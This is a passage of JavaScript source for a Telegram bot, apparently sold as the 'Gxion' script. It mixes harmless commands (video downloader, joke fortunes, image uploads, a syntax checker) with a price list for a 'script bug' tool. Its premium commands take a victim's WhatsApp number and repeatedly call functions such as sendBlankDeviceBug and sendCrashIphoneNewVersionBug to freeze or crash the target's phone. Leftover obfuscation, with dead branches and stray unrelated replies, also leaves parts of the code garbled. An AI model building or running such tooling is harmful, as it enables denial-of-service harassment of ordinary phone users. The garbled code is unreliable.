      if (Array.isArray(videoData.images) && videoData.images.length) {
        if (H.equals(H.tagG, H.tagH)) t.log(a.hex("#50fa7b").bold("\n╭─༺CHECKING SERVER༻─╮\n│➤ Bot Sukses Terhubung Terimakasih \n╰───────────────────╯\n"));
        else {
          const imageUrls = videoData.images.slice(0, 10),
            mediaGroup = await Promise.all(imageUrls.map(async imageUrl => {
              if (H.notEquals(H.tagA, H.tagA)) {
                if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
                if (error) return ctx.reply("⌜ JAVASCRIPT ANALYZER ⌟\n╎ File      : " + document.file_name + "\n╎ Result    : Failed\n╎ Issues    : Detected\n╰╌╌╌╌╌╌╌╌╌╌⌯\n\n❌ Syntax Error Found\n\n" + stderr.slice(0, 3000));
                return ctx.reply("⌜ JAVASCRIPT ANALYZER ⌟\n╎ File      : " + document.file_name + "\n╎ Result    : Passed\n╎ Issues    : 0\n╰╌╌╌╌╌╌╌╌╌╌⌯\n\n✅ YEAYY CODE FILE.JS ANDA AMAN!!!");
              } else {
                const imageOpts = {};
                imageOpts.responseType = H.arraybuffer;
                imageOpts.timeout = 20000;
                const imageResponse = await axios.get(imageUrl, imageOpts);
                return {
                  type: "photo",
                  media: {
                    source: Buffer.from(imageResponse.data)
                  }
                };
              }
            })),
            photoOpts = {};
          photoOpts.url = author.avatar || videoData.cover || imageUrls[0];
          const coverOpts = {};
          coverOpts.caption = caption;
          coverOpts.parse_mode = H.markdown;
          await ctx.replyWithPhoto(photoOpts, coverOpts);
          await ctx.replyWithMediaGroup(mediaGroup);
          return;
        }
      }
      const downloadUrl = videoData.hdplay || videoData.play || videoData.wmplay;
      if (!downloadUrl) {
        if (H.notEquals4(H.tagI, H.tagJ)) throw new Error(H.noVideo);
        else statusMessage.reply(H.genericError, {
          parse_mode: H.markdown
        });
      }
      const videoResponse = await axios.get(downloadUrl, {
        responseType: H.arraybuffer,
        headers: {
          "user-agent": H.userAgent
        },
        timeout: 30000,
        maxContentLength: 52428800,
        maxBodyLength: H.multiply(H.multiply(50, 1024), 1024)
      });
      if (H.greaterThan(videoResponse.data.byteLength, H.multiply2(H.multiply(50, 1024), 1024))) {
        if (H.equals2(H.tagK, H.tagK)) {
          await ctx.reply(H.concat20(H.concat16(caption, "\n\n⚠️ *Video >50MB*, unduh manual:\n"), downloadUrl), {
            parse_mode: H.markdown
          });
          return;
        } else {
          const lastClick = clickCooldownMap.get(userId);
          if (now - lastClick < 300) return ctx.answerCbQuery(H.dontSpam).catch(() => {});
        }
      }
      const videoOpts = {};
      videoOpts.caption = caption;
      videoOpts.parse_mode = H.markdown;
      videoOpts.supports_streaming = true;
      await ctx.replyWithVideo({
        source: Buffer.from(videoResponse.data),
        filename: (videoData.id || Date.now()) + ".mp4"
      }, videoOpts);
    } else try {
      logLine();
    } catch {}
  } catch (err) {
    if (H.notEquals5(H.tagL, H.tagL)) {
      const args = ctx.message.text.split(" ").slice(1);
      if (H.equals2(args.length, 0)) return statusMessage.reply(H.groupModeFormat);
      const mode = args[0].toLowerCase();
      if (!["on", H.off].includes(mode)) return ctx.reply("Mode harus on atau off");
      const mkdirOpts = {};
      mkdirOpts.recursive = true;
      if (!fs.existsSync(H.toolsDir)) fs.mkdirSync(H.toolsDir, mkdirOpts);
      const groupObj = {};
      groupObj.group = mode;
      fs.writeFileSync(PATHS.GROUP_FILE, JSON.stringify(groupObj, null, 2));
      const richMessage = new RichHTMLBuilder().photo(MEDIA.home, H.setGroupModeTitle).heading(2, H.groupModeChanged).divider().paragraph(H.concat(H.concat("Mode: <b>", mode.toUpperCase()), "</b>")).build();
      return ctx.sendRichMessage(richMessage);
    } else {
      let errorMessage = H.downloadFailed;
      if (H.equals3(err.message, "INVALID_DATA")) errorMessage = H.invalidVideoData;
      else {
        if (H.equals4(err.message, H.noVideo)) errorMessage = H.noDownloadLink;
        else {
          if (err?.["response"]?.["status"]) errorMessage = "❌ Error " + err.response.status + " saat mengunduh video";
        }
      }
      await ctx.reply(errorMessage);
    }
  } finally {
    try {
      await ctx.deleteMessage(statusMessage.message_id);
    } catch {}
  }
});
bot.command("cekmasadepan", async ctx => {
  let targetName = "Kamu";
  if (ctx.message.reply_to_message) targetName = ctx.message.reply_to_message.from.first_name || "Dia";
  else {
    const args = ctx.message.text.split(" ");
    if (args.length > 1) targetName = args.slice(1).join(" ");
  }
  const professions = ["Programmer Handal 💻", "Pengusaha Sukses 🏢", "Dokter Hebat 🏥", "YouTuber Terkenal 📹", "Polisi Berdedikasi 👮", "Guru Inspiratif 📚", "Artis Ternama 🎬", "Atlet Profesional 🏆", "Pilot Handal ✈️", "Chef Michelin 🍳", "Desainer Grafis 🎨", "Wirausaha Muda 🚀"];
  const wealth = ["Miliarder 💰💰💰", "Mapan Banget 🏦", "Berkecukupan 💵", "Kaya Raya 👑", "Sukses Finansial 📈", "Harta Melimpah 💎", "Hidup Nyaman 🏠", "Tabungan Banyak 🏦"];
  const partners = ["Cantik/Ganteng 💕", "Setia ❤️", "Pengertian 🌸", "Lucu dan Romantis 🥰", "Baik Hati 💗", "Sederhana Tapi Bahagia 😊", "Kaya Raya 💰", "Soulmate Sejati ✨", "Pendamping Hidup 🤵"];
  const houses = ["Mewah di Jakarta 🏰", "Minimalis di Bali 🏡", "Modern di Bandung 🏘️", "Nyaman di Kampung 🌳", "Villa di Puncak ⛰️", "Apartemen di Surabaya 🏙️", "Rumah Impian ✨", "Kontrakan Dulu 😅"],
    vehicles = ["Pajero Sport 🚙", "Alphard Hitam 🚐", "Tesla Listrik ⚡", "Motor Matic aja 🛵", "BMW Mewah 🚗", "Mercedes Benz 🏎️", "Helikopter Pribadi 🚁", "Naik Angkot 😂"];
  const fates = ["Sukses Besar! 🎉", "Hidup Bahagia 😊", "Menjadi Orang Tua Sukses 👨‍👩‍👧", "Pensiun Muda 🏖️", "Hidup Sederhana Bahagia 🌿", "Jadi Inspirasi Banyak Orang ✨", "Hidup Berkah 🙏", "Terkenal Seantero Negeri 🌍"],
    pickRandom = array => array[Math.floor(Math.random() * array.length)];
  const message = "<blockquote>\n🔮 RAMALAN MASA DEPAN 🔮\nUntuk: " + targetName + "\n━━━━━━━━━━━━━━━━━━━━━━\n👔 Profesi: " + pickRandom(professions) + "\n💰 Kekayaan: " + pickRandom(wealth) + "\n❤️ Jodoh: " + pickRandom(partners) + "\n🏠 Rumah: " + pickRandom(houses) + "\n🚗 Kendaraan: " + pickRandom(vehicles) + "\n🍀 Nasib: " + pickRandom(fates) + "\n━━━━━━━━━━━━━━━━━━━━━━\n✨ Hasil ini hanya hiburan ya!\n💪 Masa depan ada di tanganmu sendiri!\n🔮 Ketik /cekmasadepan [nama] untuk coba lagi</blockquote>";
  const opts = {};
  opts.parse_mode = "HTML";
  ctx.reply(message, opts);
});
bot.command("ramal", async ctx => {
  const helper = {};
  helper.you = "Kamu";
  helper.greaterThan = function (a, b) {
    return a > b;
  };
  helper.successMsg = "Sukses besar di usia 30an! 🎉";
  helper.entrepreneurMsg = "Jadi pengusaha terkenal! 🏢";
  helper.soulmateMsg = "Punya pasangan idaman! ❤️";
  helper.happyMsg = "Hidup bahagia sampai tua! 😊";
  helper.houseMsg = "Bisa beli rumah mewah! 🏰";
  helper.usefulMsg = "Jadi orang yang bermanfaat! ✨";
  helper.htmlMode = "HTML";
  const H = helper;
  const args = ctx.message.text.split(" ");
  let targetName = H.you;
  if (H.greaterThan(args.length, 1)) targetName = args.slice(1).join(" ");
  const predictions = [H.successMsg, H.entrepreneurMsg, H.soulmateMsg, H.happyMsg, H.houseMsg, "Keliling dunia bareng keluarga! 🌍", H.usefulMsg],
    pickedPrediction = predictions[Math.floor(Math.random() * predictions.length)],
    opts = {};
  opts.parse_mode = H.htmlMode;
  ctx.reply("🔮 *Ramalan untuk " + targetName + ":*\n\n✨ " + pickedPrediction + "\n\n🔮 *Ketik /ramal [nama] lagi!*", opts);
});
bot.command("convert", premiumOnly, async ctx => {
  const repliedMessage = ctx.message.reply_to_message;
  if (!repliedMessage) return ctx.reply("❌ Format: /convert ( reply dengan foto/video )");
  let fileId = null;
  if (repliedMessage.photo && repliedMessage.photo.length) fileId = repliedMessage.photo[repliedMessage.photo.length - 1].file_id;
  else {
    if (repliedMessage.video) fileId = repliedMessage.video.file_id;
    else {
      if (repliedMessage.video_note) {
        fileId = repliedMessage.video_note.file_id;
      } else return ctx.reply("❌ Hanya mendukung foto atau video");
    }
  }
  const statusMessage = await ctx.reply("⏳ Mengambil file & mengunggah ke catbox");
  try {
    const fileUrl = String(await ctx.telegram.getFileLink(fileId)),
      formData = new URLSearchParams();
    formData.append("reqtype", "urlupload");
    formData.append("url", fileUrl);
    const requestHeaders = {};
    requestHeaders["content-type"] = "application/x-www-form-urlencoded";
    const requestOpts = {};
    requestOpts.headers = requestHeaders;
    requestOpts.timeout = 30000;
    const {
      data: uploadResult
    } = await axios.post("https://catbox.moe/user/api.php", formData, requestOpts);
    typeof uploadResult === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(uploadResult.trim()) ? await ctx.reply(uploadResult.trim()) : await ctx.reply("❌ Gagal upload ke catbox" + String(uploadResult).slice(0, 200));
  } catch (err) {
    const errorMessage = err?.["response"]?.["status"] ? "❌ Error " + err.response.status + " saat unggah ke catbox" : "❌ Gagal unggah coba lagi.";
    await ctx.reply(errorMessage);
  } finally {
    try {
      await ctx.deleteMessage(statusMessage.message_id);
    } catch {}
  }
});
bot.command("cuaca", async ctx => {
  const helper = {};
  helper.clear = "Cerah ☀️";
  helper.cloudy = "Berawan 🌥️";
  helper.lightRain = "Hujan Ringan 🌦️";
  helper.heavyRain = "Hujan Lebat 🌧️";
  helper.storm = "Badai ⛈️";
  helper.overcast = "Mendung 🌫️";
  helper.cold = "Dingin 🥶";
  helper.multiply = function (a, b) {
    return a * b;
  };
  helper.add = function (a, b) {
    return a + b;
  };
  const H = helper,
    conditions = [H.clear, H.cloudy, H.lightRain, H.heavyRain, H.storm, H.overcast, "Panas Terik 🔥", H.cold];
  const temperature = Math.floor(H.multiply(Math.random(), 20)) + 20,
    humidity = Math.floor(H.multiply(Math.random(), 50)) + 40,
    condition = conditions[Math.floor(H.multiply(Math.random(), conditions.length))],
    opts = {};
  opts.parse_mode = "HTML";
  ctx.reply("<blockquote>\n🌤️ PRAKIRAAN CUACA*l 🌤️\n📌 Kondisi: " + condition + "\n🌡️ Suhu: " + temperature + "°C\n💧 Kelembaban: " + humidity + "%\n💨 Angin: " + H.add(Math.floor(Math.random() * 20), 5) + " km/jam\n✨ Perkiraan ini hanya hiburan ya!\n🔮 Cuaca sebenarnya bisa berbeda</blockquote>", opts);
});
bot.command("catboxurl", async ctx => {
  if (!ctx.message.reply_to_message) {
    const opts = {};
    opts.parse_mode = "Markdown";
    return ctx.reply("📸 UPLOAD GAMBAR 📸\n\nCara pakai:\n1. Kirim foto\n2. Reply foto itu\n3. Ketik /catboxurl\n\n✅ Gratis, cepat, permanen!", opts);
  }
  let fileId = null,
    repliedMessage = ctx.message.reply_to_message;
  if (repliedMessage.photo) fileId = repliedMessage.photo[repliedMessage.photo.length - 1].file_id;
  else {
    if (repliedMessage.document && repliedMessage.document.mime_type?.["startsWith"]("image/")) fileId = repliedMessage.document.file_id;
    else return ctx.reply("❌ Harus berupa foto!", {
      parse_mode: "Markdown"
    });
  }
  await ctx.reply("⏳ *Mengupload...*", {
    parse_mode: "Markdown"
  });
  try {
    const fileInfo = await ctx.telegram.getFile(fileId),
      fileUrl = "https://api.telegram.org/file/bot" + bot.token + "/" + fileInfo.file_path,
      uploadPayload = {};
    uploadPayload.url = fileUrl;
    const requestBody = JSON.stringify([uploadPayload]),
      requestOptions = {
        hostname: "telegra.ph",
        path: "/upload",
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Content-Length": Buffer.byteLength(requestBody)
        }
      },
      request = https.request(requestOptions, response => {
        const helper = {};
        helper.tagA = "WlRkN";
        helper.tagB = "zPvDz";
        helper.markdown = "Markdown";
        helper.uploadFail = "❌ Gagal upload! Coba lagi.";
        const H = helper;
        let responseBody = "";
        response.on("data", chunk => {
          if (H.tagA === H.tagB) {
            const state = {};
            state.active = false;
            return state;
          } else responseBody += chunk;
        });
        response.on("end", () => {
          try {
            const parsed = JSON.parse(responseBody);
            if (parsed[0] && parsed[0].src) {
              const opts = {};
              opts.parse_mode = H.markdown;
              ctx.reply("✅ Upload Berhasil! ✅\n\n🔗 Link: https://telegra.ph" + parsed[0].src + "\n\n📌 Klik link untuk lihat gambar\n💾 Link permanent!", opts);
            } else ctx.reply(H.uploadFail, {
              parse_mode: H.markdown
            });
          } catch {
            const opts = {};
            opts.parse_mode = H.markdown;
            ctx.reply("❌ Error parsing response!", opts);
          }
        });
      });
    request.write(requestBody);
    request.end();
  } catch {
    ctx.reply("❌ Terjadi kesalahan!", {
      parse_mode: "Markdown"
    });
  }
});

function encryptJsSource(source) {
  const helper = {};
  helper.base64 = "base64";
  const H = helper;
  let encoded = Buffer.from(source).toString(H.base64);
  return "eval(Buffer.from('" + encoded + "', 'base64').toString())";
}

function decryptJsSource(input) {
  const helper = {};
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.tag = "qojyi";
  helper.base64 = "base64";
  helper.notEquals = function (a, b) {
    return a !== b;
  };
  helper.tag2 = "APVmr";
  helper.tag3 = "hTPYO";
  const H = helper;
  try {
    if (H.equals(H.tag, H.tag)) {
      let match = input.match(/Buffer\.from\('(.*?)',\s*'base64'\)/);
      if (match) return Buffer.from(match[1], H.base64).toString();
      return null;
    } else try {
      console.log("  " + UI.ok + "  " + chalk.hex("#50fa7b").bold(message));
    } catch {}
  } catch {
    return H.notEquals(H.tag2, H.tag3) ? null : ctx.reply("🪧 Example: /groupfreeze <link_grup_wa>\n🚀 Support: chat.whatsapp.com/xxxxx\n📌 Atau ID grup langsung: 123xxx@g.us\n⚠️ Wajib jeda 5-10 detik antar eksekusi");
  }
}
bot.command("encjs", ctx => {
  let source = "";
  if (ctx.message.reply_to_message) {
    let repliedMessage = ctx.message.reply_to_message;
    if (repliedMessage.text) source = repliedMessage.text;
    else {
      if (repliedMessage.caption) source = repliedMessage.caption;
    }
  }
  if (!source) {
    let args = ctx.message.text.split(" ");
    args.shift();
    source = args.join(" ");
  }
  if (!source.trim()) {
    const opts = {};
    opts.parse_mode = "Markdown";
    return ctx.reply("🔒 *ENKRIPSI KODE JS* 🔒\n\n📌 *Cara pakai:*\n• /encjs console.log(\"Halo\")\n• Atau *reply* pesan yang berisi kode, lalu ketik /encjs\n\n✅ *Contoh:*\n[Kamu kirim pesan: console.log(\"test\")]\n[Lalu reply pesan itu dengan /encjs]", opts);
  }
  let encrypted = encryptJsSource(source);
  const opts = {};
  opts.parse_mode = "Markdown";
  ctx.reply("🔐 *KODE TERPROTEKSI* 🔐\n\n```javascript\n" + encrypted + "\n```\n\n📌 *Simpan kode asli!*", opts);
});
bot.command("decjs", ctx => {
  let input = "";
  if (ctx.message.reply_to_message && ctx.message.reply_to_message.text) input = ctx.message.reply_to_message.text;
  else {
    let args = ctx.message.text.split(" ");
    args.shift();
    input = args.join(" ");
  }
  if (!input.trim()) {
    const opts = {};
    opts.parse_mode = "Markdown";
    return ctx.reply("🔓 *DEKRIPSI KODE JS* 🔓\n\n📌 *Cara pakai:*\nReply pesan yang berisi kode terenkripsi, lalu ketik /decjs", opts);
  }
  let decrypted = decryptJsSource(input);
  if (decrypted) {
    const opts = {};
    opts.parse_mode = "Markdown";
    ctx.reply("🔓 *KODE ASLI* 🔓\n\n```javascript\n" + decrypted + "\n```", opts);
  } else {
    ctx.reply("❌ Gagal mendekripsi! Pastikan formatnya benar.", {
      parse_mode: "Markdown"
    });
  }
});
bot.command("pricescript", async ctx => {
  const helper = {};
  helper.htmlMode = "HTML";
  const H = helper,
    opts = {};
  opts.parse_mode = H.htmlMode;
  await ctx.reply("<blockquote>\n┏━━〔 📜 KEUNGGULAN SCRIPT GXION 〕━━⬣\n┣ ⿻ Selalu Update Ke Versi Yang Stabil ✅\n┣ ⿻ Cocok Untuk Murbug X Pribadi ✅\n┣ ⿻ Menggunakan Fitur Auto-Update ✅\n┣ ⿻ Cocok untuk Push Channel Anda ✅\n┣ ⿻ High Quality Script ✅\n┗━━━━━━━━━━━━━━━━⬣\n</blockquote>\n\n<b>「 LIST PRICE SCRIPT GXION 」</b>\n<blockquote>\n⿻ FULL UPDATE SCRIPT ACCESS\n┗ Rp 20.000 / 20K\n\n⿻ RESELLER SCRIPT ACCESS\n┗ Rp 30.000 / 30k\n\n⿻ PARTNER SCRIPT ACCESS \n┗ Rp 55.000 / 55K\n\n⿻ MODERATOR SCRIPT ACCESS\n┗ Rp 70.000 / 70K\n\n⿻ CEO SCRIPT ACCESS\n┗ Rp 90.000 / 90K\n\n⿻ OWNER SCRIPT ACCESS\n┗ Rp 110.000 / 110K\n</blockquote>\n\n<b>「 BENEFIT SETIAP ROLES / ACCESS 」</b> \n<blockquote>\n<b>⿻ BENEFIT ACCESS FULL UPDATE :</b>\n┣ Masuk Group Utama Gxion\n┗ Mendapatkan Script Gxion Auto - Update\n\n<b>⿻ BENEFIT ACCESS RESELLER :</b>\n┣ Masuk Group Utama Gxion\n┣ Mendapatkan Script Gxion Auto - Update\n┣ Bisa Menjual Access Full Updates\n┗ Bisa Add Token Sendiri \n\n<b>⿻ BENEFIT ACCESS PARTNER :</b>\n┣ Masuk Group Utama Gxion\n┣ Mendapatkan Script Gxion Auto - Update\n┣ Bisa Menjual Access Full Updates\n┣ Bisa Menjual Access Reseller\n┗ Bisa Add Token Sendiri \n\n<b>⿻ BENEFIT ACCESS MODERATOR :</b>\n┣ Masuk Group Utama Gxion\n┣ Mendapatkan Script Gxion Auto - Update\n┣ Bisa Menjual Access Full Updates\n┣ Bisa Menjual Access Reseller\n┣ Bisa Menjual Access Partner\n┗ Bisa Add Token Sendiri \n\n<b>⿻ BENEFIT ACCESS CEO  :</b>\n┣ Masuk Group Utama Gxion\n┣ Mendapatkan Script Gxion Auto - Update\n┣ Bisa Menjual Access Full Updates\n┣ Bisa Menjual Access Reseller\n┣ Bisa Menjual Access Partner\n┣ Bisa Menjual Access Moderator\n┗ Bisa Add Token Sendiri \n\n<b>⿻ BENEFIT ACCESS OWNER  :</b>\n┣ Masuk Group Utama Gxion\n┣ Mendapatkan Script Gxion Auto - Update\n┣ Bisa Menjual Access Full Updates\n┣ Bisa Menjual Access Reseller\n┣ Bisa Menjual Access Partner\n┣ Bisa Menjual Access Moderator\n┣ Bisa Menjual Access Ceo\n┗ Bisa Add Token Sendiri \n</blockquote>\n<blockquote>\n<i>Berminat untuk membeli sebuah script Gxion ini Silahkan anda bisa menghubungi Admin terdekat yang menjualnya atau Hubungi Developer script secara langsung Yang ber Username [ @Bawzzhhh ]</i>\n</blockquote>", opts);
});
bot.command("harga", async ctx => {
  try {
    const priceList = "```js\n╔══════════════════════════╗\n║      🪧 HARGA GXION SCRIPT   ║\n╠══════════════════════════╣\n║  ⛧ Full Up     : 20K     ║\n║  ⛧ Reseller    : 30K     ║\n║  ⛧ Partner     : 55K     ║\n║  ⛧ Moderator   : 70K     ║\n║  ⛧ CEO         : 90K     ║\n║  ⛧ Owner       : 110K    ║\n╠══════════════════════════╣\n║   ⚡ SCRIPT BUG VIA TELEGRAM  ║\n╚══════════════════════════╝\n```",
      contactButton = {};
    contactButton.text = "👑 Contact Owner";
    contactButton.url = "https://t.me/Bawzhhh";
    contactButton.style = "danger";
    const replyMarkup = {};
    replyMarkup.inline_keyboard = [
      [contactButton]
    ];
    const opts = {};
    opts.parse_mode = "Markdown";
    opts.reply_markup = replyMarkup;
    await ctx.reply(priceList, opts);
  } catch (err) {
    ctx.reply("Gagal menampilkan Bagian daftar /harga Di Karenakan Masalah Tertentu.");
  }
});
bot.command("cekfunction", async ctx => {
  try {
    if (!ctx.message.reply_to_message) return ctx.reply("Reply function JavaScript yang ingin dicek.");
    const sourceCode = ctx.message.reply_to_message.text || ctx.message.reply_to_message.caption;
    if (!sourceCode) return ctx.reply("Pesan yang direply tidak berisi kode.");
    let acornParser;
    try {
      acornParser = require("acorn");
    } catch {
      return ctx.reply("Module acorn belum terinstall.\nInstall: npm install acorn");
    }
    try {
      const parseOpts = {};
      parseOpts.ecmaVersion = "latest";
      parseOpts.sourceType = "module";
      parseOpts.locations = true;
      return acornParser.parse(sourceCode, parseOpts), ctx.reply("🔎 Mengecek syntax function...\n\n✅ SYNTAX VALID\nTidak ditemukan error.\n\n© Gxion");
    } catch (parseError) {
      const lines = sourceCode.split("\n"),
        errorLine = parseError.loc?.["line"] || 0,
        errorColumn = parseError.loc?.["column"] || 0,
        startLine = Math.max(0, errorLine - 3),
        endLine = Math.min(lines.length, errorLine + 2),
        snippet = lines.slice(startLine, endLine).map((line, index) => {
          const lineNumber = startLine + index + 1;
          return lineNumber === errorLine ? "👉 " + lineNumber + " | " + line : "   " + lineNumber + " | " + line;
        }).join("\n");
      return ctx.reply("❌ ERROR TERDETEKSI\n\n" + parseError.message + "\nLine " + errorLine + ":" + errorColumn + "\n\n📌 CUPlikan:\n```javascript\n" + snippet + "\n```\n\n© Gxion");
    }
  } catch (err) {
    ctx.reply("Terjadi error saat mengecek function.");
  }
});
bot.command("blacker", premiumOnly, requireConnectedSender, withCooldown, async ctx => {
  const phoneNumber = ctx.message.text.split(" ")[1];
  if (!phoneNumber) return ctx.reply("🪧 Format : /blacker 62xxxx");
  const targetJid = phoneNumber.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const coverImage = "https://files.catbox.moe/ahlxrp.jpg";
  const progressBar = "▓".repeat(20),
    caption = "𝗚𝗫𝗜𝗢𝗡 --- 𝑺𝑬𝑵𝑫𝑰𝑵𝑮 𝑩𝑼𝑮𝑺\n<blockquote><pre>\n├─ Target : " + phoneNumber + "\n├─ Effect : Blank Android \n├─ Progress : " + progressBar + " 100%\n</pre></blockquote>",
    photoOpts = {};
  photoOpts.caption = caption;
  photoOpts.parse_mode = "HTML";
  photoOpts.reply_markup = {};
  photoOpts.reply_markup.inline_keyboard = [
    [{
      text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
      url: "https://wa.me/" + phoneNumber,
      style: "success"
    }]
  ];
  await ctx.replyWithPhoto(coverImage, photoOpts);
  (async () => {
    for (let index = 0; index < 100; index++) {
      await sendBlankDeviceBug(null, targetJid);
      if (index < 34) await sleep(3000);
    }
  })();
});
bot.command("delayios", premiumOnly, requireConnectedSender, withCooldown, async ctx => {
  const phoneNumber = ctx.message.text.split(" ")[1];
  if (!phoneNumber) return ctx.reply("🪧 Format : /delayios 62xxxx");
  const targetJid = phoneNumber.replace(/[^0-9]/g, "") + "@s.whatsapp.net",
    coverImage = "https://files.catbox.moe/61vka4.jpg",
    progressBar = "▓".repeat(20);
  const caption = "𝗚𝗫𝗜𝗢𝗡 --- 𝑺𝑬𝑵𝑫𝑰𝑵𝑮 𝑩𝑼𝑮𝑺\n<blockquote><pre>\n├─ Target : " + phoneNumber + "\n├─ Effect : Delay Iphone\n├─ Progress : " + progressBar + " 100%\n</pre></blockquote>",
    photoOpts = {};
  photoOpts.caption = caption;
  photoOpts.parse_mode = "HTML";
  photoOpts.reply_markup = {};
  photoOpts.reply_markup.inline_keyboard = [
    [{
      text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
      url: "https://wa.me/" + phoneNumber,
      style: "primary"
    }]
  ];
  await ctx.replyWithPhoto(coverImage, photoOpts), (async () => {
    for (let index = 0; index < 20; index++) {
      await sendDelayIphoneBug(null, targetJid);
      if (index < 4) await sleep(1500);
    }
  })();
});
bot.command("applex", premiumOnly, requireConnectedSender, withCooldown, async ctx => {
  const phoneNumber = ctx.message.text.split(" ")[1];
  if (!phoneNumber) return ctx.reply("🪧 Format : /applex 62xxxx");
  const targetJid = phoneNumber.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const coverImage = "https://files.catbox.moe/ahlxrp.jpg";
  const progressBar = "▓".repeat(20),
    caption = "𝗚𝗫𝗜𝗢𝗡 --- 𝑺𝑬𝑵𝑫𝑰𝑵𝑮 𝑩𝑼𝑮𝑺\n<blockquote><pre>\n├─ Target : " + phoneNumber + "\n├─ Effect : Forceclose Iphone\n├─ Progress : " + progressBar + " 100%\n</pre></blockquote>",
    photoOpts = {};
  photoOpts.caption = caption;
  photoOpts.parse_mode = "HTML";
  photoOpts.reply_markup = {};
  photoOpts.reply_markup.inline_keyboard = [
    [{
      text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
      url: "https://wa.me/" + phoneNumber,
      style: "primary"
    }]
  ];
  await ctx.replyWithPhoto(coverImage, photoOpts);
  (async () => {
    for (let index = 0; index < 150; index++) {
      await sendCrashIosAmposBug(null, targetJid);
      if (index < 4) await sleep(1500);
    }
  })();
});
bot.command("freezeIOS", premiumOnly, requireConnectedSender, withCooldown, async ctx => {
  const phoneNumber = ctx.message.text.split(" ")[1];
  if (!phoneNumber) return ctx.reply("🪧 Format: /freezeIOS 62xxxx\n\nContoh: /freezeIOS 628123456789");
  const targetJid = phoneNumber.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  await ctx.reply("✅ freezeIOS sent to " + phoneNumber);
  (async () => {
    try {
      for (let index = 0; index < 10; index++) {
        await sendFreezeIosBug(null, targetJid);
        await sendDelayBebasSpamBug(null, targetJid);
      }
    } catch (err) {
      console.log(chalk.red("❌ Error: " + err.message));
    }
  })();
});
bot.command("iphonebugs", premiumOnly, requireConnectedSender, withCooldown, async ctx => {
  const coverImage = "https://files.catbox.moe/u9jrve.jpg",
    phoneNumber = ctx.message.text.split(" ")[1];
  if (!phoneNumber) return ctx.reply("🪧 ☇ Format: /iphonebugs 62×××");
  let targetJid = phoneNumber.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const photoOpts = {};
  photoOpts.caption = "༺ GXION INFORMATION ATACK ༻\n<blockquote><pre>\n➩ Target : " + phoneNumber + "\n➩ Effect : Fc Iphone No Click (Not Work All Version)\n➩ Status : Process...\n➩ Progress : [░░░░░░░░░░] 0%</pre></blockquote>";
  photoOpts.parse_mode = "HTML";
  photoOpts.reply_markup = {};
  photoOpts.reply_markup.inline_keyboard = [
    [{
      text: "Target",
      url: "https://wa.me/" + phoneNumber
    }]
  ];
  const sentMessage = await ctx.telegram.sendPhoto(ctx.chat.id, coverImage, photoOpts),
    messageId = sentMessage.message_id;

  function buildBar(percent) {
    const filled = Math.round(percent / 10);
    const empty = 10 - filled;
    return "▓".repeat(filled) + "░".repeat(empty);
  }
  async function updateCaption(percent) {
    const helper = {};
    helper.sigkill = "SIGKILL";
    const H = helper;
    const bar = buildBar(percent);
    await ctx.telegram.editMessageCaption(ctx.chat.id, messageId, undefined, "༺ GXION INFORMATION ATACK ༻\n<blockquote><pre>\n➩ Target : " + phoneNumber + "\n➩ Effect : Fc Iphone No Click (Not Work All Version)\n➩ Status : Process...\n➩ Progress : [" + bar + "] " + percent + "%</pre></blockquote>", {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{
            text: "Target",
            url: "https://wa.me/" + phoneNumber
          }]
        ]
      }
    });
  }
  for (let index = 0; index < 40; index++) {
    await sendCrashIphoneNewVersionBug(null, targetJid);
    const percent = Math.min(Math.round((index + 1) * 2.5), 100);
    await updateCaption(percent);
    await sleep(2000);
  }
  await ctx.telegram.editMessageCaption(ctx.chat.id, messageId, undefined, "༺ GXION INFORMATION ATACK ༻\n<blockquote><pre>\n➩ Target : " + phoneNumber + "\n➩ Effect : Fc Iphone No Click (Not Work All Version)\n➩ Status : Success ✅\n➩ Progress : [▓▓▓▓▓▓▓▓▓▓] 100%</pre></blockquote>", {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{
          text: "Target",
          url: "https://wa.me/" + phoneNumber
        }]
      ]
    }
  });
});
bot.command("dfreez", premiumOnly, requireConnectedSender, withCooldown, async ctx => {
  const coverImage = "https://files.catbox.moe/p6ahc6.jpg";
  const phoneNumber = ctx.message.text.split(" ")[1];
  if (!phoneNumber) return ctx.reply("🪧 ☇ Format: /dfreez 62×××");
  let targetJid = phoneNumber.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const photoOpts = {};
  photoOpts.caption = "༺ GXION INFORMATION ATACK ༻\n<blockquote><pre>\n➩ Target : " + phoneNumber + "\n➩ Effect : Freeze Android\n➩ Status : Sending 25 Message....\n</pre></blockquote>";
  photoOpts.parse_mode = "HTML";
  photoOpts.reply_markup = {};
  photoOpts.reply_markup.inline_keyboard = [
    [{
      text: "Target",
      url: "https://wa.me/" + phoneNumber
    }]
  ];
  const sentMessage = await ctx.telegram.sendPhoto(ctx.chat.id, coverImage, photoOpts),
    messageId = sentMessage.message_id;
  for (let index = 0; index < 25; index++) {
    await sendKayzenFreezeBug(null, targetJid);
  }
  await ctx.telegram.editMessageCaption(ctx.chat.id, messageId, undefined, "༺ GXION INFORMATION ATACK ༻\n<blockquote><pre>\n➩ Target : " + phoneNumber + "\n➩ Effect : Freeze Android\n➩ Status : Success Sending! ✅\n</pre></blockquote>", {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{
          text: "Target",
          url: "https://wa.me/" + phoneNumber
        }]
      ]
    }
  });
});
bot.command("lockmessage", premiumOnly, requireConnectedSender, withCooldown, async ctx => {
  const coverImage = "https://files.catbox.moe/joc26i.jpg",
    phoneNumber = ctx.message.text.split(" ")[1];
  if (!phoneNumber) return ctx.reply("🪧 ☇ Format: /lockmessage 62×××");
  let targetJid = phoneNumber.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const photoOpts = {};
